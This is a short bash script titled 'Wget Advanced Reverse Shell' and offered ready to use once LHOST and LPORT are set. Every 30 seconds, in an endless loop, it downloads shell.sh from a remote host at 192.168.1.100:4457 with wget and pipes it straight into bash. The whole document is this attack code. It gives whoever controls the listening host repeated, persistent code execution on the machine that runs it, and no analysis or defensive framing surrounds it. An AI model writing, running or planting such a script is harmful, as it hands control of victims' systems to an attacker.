#!/bin/bash
# Wget Advanced Reverse Shell
# Configure LHOST and LPORT before use

LHOST="192.168.1.100"
LPORT=4457

while true; do
    wget -qO- http://$LHOST:$LPORT/shell.sh | bash
    sleep 30
done
